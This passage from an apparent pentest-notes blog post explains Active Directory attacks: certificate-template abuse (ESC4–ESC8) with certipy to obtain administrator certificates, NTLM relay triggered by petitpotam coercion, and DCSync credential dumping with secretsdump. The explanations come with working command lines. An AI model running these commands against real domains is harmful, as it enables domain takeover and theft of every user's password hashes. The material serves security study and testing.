</pre></table></code></div></div><p>Now that the template is vulnerable to <code class="language-plaintext highlighter-rouge">ESC1</code>, we can exploit it as follows:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> USER@<span class="nv">$DOMAIN</span>.local <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-target</span> <span class="nv">$CA_SERVER</span>.<span class="nv">$DOMAIN</span>.local <span class="nt">-template</span> ESC4 <span class="nt">-ca</span> <span class="nv">$CA_NAME</span> <span class="nt">-upn</span> administrator@<span class="nv">$DOMAIN</span>.local
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Because we did a modification over the template, we can rollback to the previous template using this command <code class="language-plaintext highlighter-rouge">certipy template -u USER@$DOMAIN.local -p $PASSWORD -template ESC4 -configuration ESC4.json</code> The <code class="language-plaintext highlighter-rouge">ESC4.json</code> is generated in the first command thanks to the parameter <code class="language-plaintext highlighter-rouge">-save-old</code>.</p></div></blockquote><h5 id="esc5"><span class="mr-2">ESC5</span><a href="#esc5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Because <code class="language-plaintext highlighter-rouge">ESC5</code> is less common and used so here is <a href="https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c">a link</a> that explains it in detail.</p><h5 id="esc6"><span class="mr-2">ESC6</span><a href="#esc6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>With <code class="language-plaintext highlighter-rouge">ESC6</code>, we are going to abuse the <code class="language-plaintext highlighter-rouge">ATTRIBUTESUBJECTALTNAME2</code> flag set on the <code class="language-plaintext highlighter-rouge">CA</code>. This flag allows the enrollee to specify an arbitrary SAN (Subject Alternative Name) on all certificates despite a certificate template’s configuration. To get the certificate, we can run the following command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy req <span class="nt">-u</span> USER@<span class="nv">$DOMAIN</span>.local <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-target</span> <span class="nv">$CA_SERVER</span>.<span class="nv">$DOMAIN</span>.local <span class="nt">-template</span> User <span class="nt">-ca</span> <span class="nv">$CA_NAME</span> <span class="nt">-upn</span> administrator@<span class="nv">$DOMAIN</span>.local
</pre></table></code></div></div><h5 id="esc7"><span class="mr-2">ESC7</span><a href="#esc7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>As for <code class="language-plaintext highlighter-rouge">ESC5</code>, <code class="language-plaintext highlighter-rouge">ESC7</code> is also not common and used so here is <a href="https://www.tarlogic.com/blog/ad-cs-esc7-attack/">another link</a> to get more information about it.</p><h5 id="esc8"><span class="mr-2">ESC8</span><a href="#esc8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p><code class="language-plaintext highlighter-rouge">ESC8</code> is a bit different. We don’t request directly a certificate and use it to get the administrator <code class="language-plaintext highlighter-rouge">NT</code> hash. Here we are going to use NTLM Relay (this attack will be explained in more details in the next chapter). But the main idea is that we are going to receive a connexion with a <code class="language-plaintext highlighter-rouge">Coertion</code> for exemple (<code class="language-plaintext highlighter-rouge">Coertion</code> is the action to force a machine to authenticate to us.) and then use this received connexion to relay it to the same protocol or a different one (for more information check out the <code class="language-plaintext highlighter-rouge">NTLM relay</code> chapter). For more simple exemple, we are going to use <code class="language-plaintext highlighter-rouge">certipy</code> that will do the NTLM relay for us.</p><p>First, we use <code class="language-plaintext highlighter-rouge">certipy</code> as a listener:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy relay <span class="nt">-ca</span> <span class="nv">$CA_IP</span> <span class="nt">-template</span> DomainController
</pre></table></code></div></div><p>Now we are going to use the tool <a href="https://github.com/topotam/PetitPotam">petitpotam</a> that will trigger the coertion:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>petitpotam.py <span class="nv">$OUR_IP</span> <span class="nv">$DC_NAME</span>.<span class="nv">$DOMAIN</span>.local
</pre></table></code></div></div><blockquote class="prompt-warning"><div><p>We could have used <code class="language-plaintext highlighter-rouge">Responder</code> or <code class="language-plaintext highlighter-rouge">mitm6</code> to recover the connection instead of <code class="language-plaintext highlighter-rouge">petipotam</code>. This will not use coertion but spoof different protocols to recover a connection and send it to certipy.</p></div></blockquote><p>We recover the <code class="language-plaintext highlighter-rouge">NT</code> hash and <code class="language-plaintext highlighter-rouge">TGT</code> of the DC from the certificate :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>certipy auth <span class="nt">-pfx</span> CERTIFICATE.pfx <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span>
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>For information purpose, in all above cases, <code class="language-plaintext highlighter-rouge">certipy auth</code> does not always work, but even when we can’t use it, the ESC is still exploitable by other means.</p></div></blockquote><h3 id="ntlm-relay"><span class="mr-2">NTLM Relay</span><a href="#ntlm-relay" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First of all, NTLM is NOT an isolated protocol that generates network traffic. It is only a <code class="language-plaintext highlighter-rouge">authentication protocol</code>. It must be embedded in applications protocols like <code class="language-plaintext highlighter-rouge">SMB</code>, <code class="language-plaintext highlighter-rouge">LDAP</code>or <code class="language-plaintext highlighter-rouge">HTTP</code> to work.</p><blockquote class="prompt-info"><div><p>You can have more information on the NTLM protocol on <a href="https://nouman404.github.io/Notes/AD/AD_Basics#ntlm">this section</a>.</p></div></blockquote><p>The NTLM relay is using MiTM (Man in The Middle) attack. We need to be between the client and the server. The goal here is that the server believes that we (the attacker) are the client and that the client believe that we (the attacker) are the server. But if you remember the challenge/response scheme from the NTLM section, we need the <code class="language-plaintext highlighter-rouge">NT Hash</code> of the user to be able to calculate the response to the challenge and we don’t have it. So this is when the MiTM become useful.</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/Notes/photos/AD_Relay_Scheme_bbto.png" alt="[AD_Relay_Scheme_bbto.png]" data-proofer-ignore></p><p>As we can see on the scheme, the attacker receives the <code class="language-plaintext highlighter-rouge">NEGOCIATE</code> message from the client that thinks it sent it to the server. The attacker then sends the <code class="language-plaintext highlighter-rouge">NEGOCIATE</code> message to the server that thinks the client is starting a new communication. Then the full challenge/response is done the same way as for the negotiation part without the client nor the server knowing that the attacker is receiving and sending everything. Now, we have a session as the client on the server and we can act as him.</p><blockquote class="prompt-danger"><div><p>Note that this isn’t possible if protocols are signed (ex: SMB with signing True, HTTPS, LDAP with channel binding enabled). This is because we will have a session as this user but because we don’t have his password we can’t sign the messages that follow the authentication part. The server will see that the messages are not signed correctly and it will drop the connection.</p></div></blockquote><p>You can see on the following image the protocols that can be relayed. Some can be relayed from one another and some can’t. This is due to how they manage their authentication mechanism:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: center"><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/Notes/photos/AD_Relay_Sheme_hackerRecipes.png" alt="[AD_Relay_Sheme_hackerRecipes.png]" data-proofer-ignore><tbody><tr><td style="text-align: center"><strong>Source: <a href="https://www.thehacker.recipes/ad/movement/ntlm/relay">thehackerrecipes</a></strong></table></div><blockquote class="prompt-warning"><div><p>Note that it is not possible to relay from <code class="language-plaintext highlighter-rouge">SMB</code> to <code class="language-plaintext highlighter-rouge">LDAP</code> (except using <code class="language-plaintext highlighter-rouge">CVE-2019-1040</code>)</p></div></blockquote><h3 id="ntlm-relay---exemple"><span class="mr-2">NTLM Relay - Exemple</span><a href="#ntlm-relay---exemple" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can use tools like <a href="https://nouman404.github.io/Notes/AD/Tools#responder">Responder</a> and <a href="https://nouman404.github.io/Notes/AD/Tools#ntlmrelayx">ntrlmrelayx</a> to do some relay. You can find examples on how to use those tools on the provided links.</p><h3 id="dcsync"><span class="mr-2">DCSync</span><a href="#dcsync" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We have seen a lot of attacks by now on an AD. Some of them allowed us to get <code class="language-plaintext highlighter-rouge">domain admin</code> access (access over all the domain like DC and servers). When we are <code class="language-plaintext highlighter-rouge">domain admin</code> or if we have a user with <code class="language-plaintext highlighter-rouge">DCSync</code> right, a cool thing to do is to recover every hash of every user and every machine. And when we do that, we can connect as any user on any machine (if it is allowed). Hence, because we also have the <code class="language-plaintext highlighter-rouge">domain admin</code> hash, we can connect with it on any machine of the domain.</p><p>This mechanism is called <a href="https://www.thehacker.recipes/a-d/movement/credentials/dumping/dcsync">DCSync</a> (dump of the DC information). It can be use by domain administrators for backups and by attackers to retrieve credentials. We can use tools like <code class="language-plaintext highlighter-rouge">secretsdump</code> to do that using a Kerberos ticket :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/esc8/CCACHE_FILE.ccache
secretsdump <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nv">$DOMAIN</span>.LOCAL/<span class="s2">"</span><span class="nv">$MACHINE</span><span class="s2">"</span>@<span class="nv">$DC_NAME</span>.<span class="nv">$DOMAIN</span>.local
</pre></table></code></div></div><p>Or, we could just dump all the hash of the domain using the <code class="language-plaintext highlighter-rouge">NT</code> hash instead of the <code class="language-plaintext highlighter-rouge">TGT</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>secretsdump <span class="nt">-hashes</span> <span class="s2">":</span><span class="nv">$NT_HASH_OF_DC_ACC</span><span class="s2">"</span> <span class="nt">-no-pass</span> <span class="nv">$DOMAIN</span>.LOCAL/<span class="s2">"</span><span class="nv">$MACHINE</span><span class="s2">"</span>@<span class="nv">$DC_NAME</span>.<span class="nv">$DOMAIN</span>.local
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/notes/'>Notes</a>, <a href='/categories/ad/'>AD</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ad/" class="post-tag no-text-decoration" >AD</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >Kerberos</a> <a href="/tags/ldap/" class="post-tag no-text-decoration" >LDAP</a> <a href="/tags/ntlm/" class="post-tag no-text-decoration" >NTLM</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Notes+%7C+AD+%7C+AD+Basics+-+BatBato%27s+Blog&url=nouman404.github.io%2FNotes%2FAD%2FAD_Basics" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Notes+%7C+AD+%7C+AD+Basics+-+BatBato%27s+Blog&u=nouman404.github.io%2FNotes%2FAD%2FAD_Basics" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=nouman404.github.io%2FNotes%2FAD%2FAD_Basics&text=Notes+%7C+AD+%7C+AD+Basics+-+BatBato%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/Notes/AD/AD_Basics">Notes | AD | AD Basics</a><li><a href="/Notes/AD/Tools">Notes | AD | AD Tools</a><li><a href="/CTFs/HeroCTF_2024/Steganographie/Zipper">CTFs | HeroCTF_2024 | Steganographie | Zipper</a><li><a href="/CTFs/HeroCTF_2024/Forensique/LazySysAdmin2">CTFs | HeroCTF_2024 | Forensique | LazySysAdmin2</a><li><a href="/CTFs/HeroCTF_2024/Forensique/Tenant_trouble">CTFs | HeroCTF_2024 | Forensique | Tenant trouble</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/forensique/">Forensique</a> <a class="post-tag" href="/tags/404ctf/">404CTF</a> <a class="post-tag" href="/tags/stegano/">Stegano</a> <a class="post-tag" href="/tags/fcsc/">FCSC</a> <a class="post-tag" href="/tags/forensic/">Forensic</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/stega/">Stega</a> <a class="post-tag" href="/tags/reverse/">Reverse</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/CTFs/HackTheBox/Machines/Active"><div class="card-body"> <em class="small" data-ts="1689804000" data-df="ll" > Jul 20, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTFs | HackTheBox | Machines | Active</h3><div class="text-muted small"><p> Active Enumeration First of all, we can start by running an nmap scan: The nmap scan doesn’t give much clue on what to do now, but there is an SMB share. Let’s have a look: As we can see,...</p></div></div></a></div><div class="card"> <a href="/Notes/AD/Tools"><div class="card-body"> <em class="small" data-ts="1754604000" data-df="ll" > Aug 8, 2025 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Notes | AD | AD Tools</h3><div class="text-muted small"><p> Introduction This post is about understanding how the main tools work, because it is great to achieve an attack but it’s better if you can do it from scratch. So if you know how tools work, then y...</p></div></div></a></div><div class="card"> <a href="/Notes/Linux/Linux_Fondamentals"><div class="card-body"> <em class="small" data-ts="1661292000" data-df="ll" > Aug 24, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Notes | Linux Fondamentals</h3><div class="text-muted small"><p> Linux Fondamentals First of all, why learn Linux? Well, when it comes to computing, Linux is a very useful operating system. It has many useful tools and offers high performance on different netwo...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/CTFs/Finale_CTF_INSA_2024/Realiste/" class="btn btn-outline-primary" prompt="Older"><p>CTFs | Finale_CTF_INSA_2024 | Realiste</p></a> <a href="/CTFs/404_CTF_2024/Cryptanalyse/Bebe_Nageur" class="btn btn-outline-primary" prompt="Newer"><p>CTFs | 404CTF_2024 | Cryptanalyse | Bebe Nageur</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/Nouman404/">Bat</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/forensique/">Forensique</a> <a class="post-tag" href="/tags/404ctf/">404CTF</a> <a class="post-tag" href="/tags/stegano/">Stegano</a> <a class="post-tag" href="/tags/fcsc/">FCSC</a> <a class="post-tag" href="/tags/forensic/">Forensic</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/stega/">Stega</a> <a class="post-tag" href="/tags/reverse/">Reverse</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
